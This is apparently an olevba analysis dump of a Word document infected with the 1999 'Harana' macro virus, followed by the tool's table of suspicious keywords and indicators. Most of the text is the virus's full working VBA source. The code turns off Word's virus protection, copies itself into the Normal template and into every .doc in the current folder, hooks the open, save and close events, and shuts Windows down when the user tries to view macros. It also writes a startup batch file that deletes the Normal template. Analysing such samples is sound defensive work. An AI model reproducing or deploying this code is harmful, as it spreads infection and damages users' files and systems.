olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Harana-ee409095914b6760f65d11ff70413fd863e8048b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Harana-ee409095914b6760f65d11ff70413fd863e8048b 
in file: Virus.MSWord.Harana-ee409095914b6760f65d11ff70413fd863e8048b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
	'The Harana virus
	'--------------------
	' by: Kinetic Stab
	' (c) 1999 HNetworx
	' www.hnetworx.iscool.net

Sub kinetic1()
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("kinetic1").Export "c:\kinetic1.drv"
ActiveDocument.ReadOnlyRecommended = False
rgen = Int(Rnd * 100)
    If rgen = 99 Then MsgBox "Ikaw, ang bigay ng maykapal.",vbSystemModal
If Month(Now()) = 9 And Day(Now()) = 10 Then MsgBox "I have arrived. You waited too long!",vbinformation, "A few words from me"
amacc13 = letran12 & lasalle32 & Int(Rnd * 3372)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Kinetic Stab"
    .Title = "Uso pa ba ang Harana. Marahil ikaw ay nagtataka"
    .Subject = "The simplest form of macro viruses"
    .Comments = "(C) 1999 by Kinetic Stab of HNetworx. Jowart, anong masasabi mo?"
    .Execute
End With
tre17 = ponga13 & kulangot93
 DuBo8950$ = "C:\%windir%\startm~1\programs\startup\intro"
VhHq14868891 = GetAttr(NormalTemplate.FullName)
If VhHq14868891 = vbReadOnly and System.OperatingSystem = "Windows" and System.LanguageDesignation = "English(United States)" Then Call ReadOnly(DuBo8950$)
milette = idol & mia
If VhHq14868891 = vbReadOnly + vbArchive and System.OperatingSystem = "Windows" and System.LanguageDesignation = "English(United States)" Then Call ReadOnly(DuBo8950$)
If VhHq14868891 = vbReadOnly Then GoTo shit
If VhHq14868891 = vbReadOnly + vbArchive Then GoTo shit
If NormalTemplate.VBProject.VBComponents.Item("kinetic1").Name <> "kinetic1" Then exist = True
If ActiveDocument.VBProject.VBComponents.Item("kinetic1").Name <> "kinetic1" Then exist1 = True
maidcr = mary & idol & cruz & iloveu
If exist = True And exist1 = False Then Set ikaw = NormalTemplate.VBProject.VBComponents
If exist = False And exist1 = True Then Set ikaw = ActiveDocument.VBProject.VBComponents
ikaw.import "c:\kinetic1.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If exist1 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
butas = ang & pekwa
shit:
End Sub
Sub HelpAbout()
    On Error Resume Next
uso = pabaang & harana1 & Int(Rnd * 5604)
    MsgBox "The Harana Virus (c) 1999 by Kinetic Stab of HNetworx (http://surf.to/hacknet.com)",vbInformation
End Sub
Sub FileSave()
    On Error Resume Next
    Call kinetic1
pilay = tisay2 & sexy6
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
iw2suu = vanessa & regine & lucy24 & laeticia
Dialogs(wdDialogFileSaveAs).Show
    Call kinetic1
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call kinetic1
End Sub
Sub AutoExit()
    On Error Resume Next
    Call kinetic1
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call kinetic1
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call kinetic1
End If
Loop
End Sub
Sub AutoExec()
    On Error Resume Next
    Call kinetic1
End Sub
Sub AutoClose()
    On Error Resume Next
    Call kinetic1
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call steltop
ThPi6524 = NeMsLhNn & UpLe15435 & Int(Rnd * 4937)
PsSzSnIe = HuBj7738 & OiKz11844
End Sub
Sub FileTemplates()
    On Error Resume Next
syota = nobya & gelpren
    Call steltop
irog = cupcake & babes
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call steltop
End Sub
Sub steltop()
    On Error Resume Next
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
    
Sub ReadOnly(strFile As String)
    
Dim hex As Long
On Error Resume Next
n$ = NormalTemplate
uno$ = "attrib -h -r "
dos$ = "c:\progra~1\micros~1\templa~1\"
dos1$ = "c:\progra~1\micros~2\templa~1\"
tres$ = "del "
hex = FreeFile
Open strFile For Output Access Write As hex
Print #hex, "@echo off"
Print #hex, uno$ + dos$ + n$
Print #hex, uno$ + dos1$ + n$
Print #hex, tres$ + dos$ + n$
Print #hex, tres$ + dos1$ + n$
Print #hex, "cls"
Print #hex, tres$ + "C:\%windir%\startm~1\programs\startup\intro.bat"
Close hex
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://surf.to/hackn|URL                                          |
|          |et.com              |                                             |
|IOC       |intro.bat           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

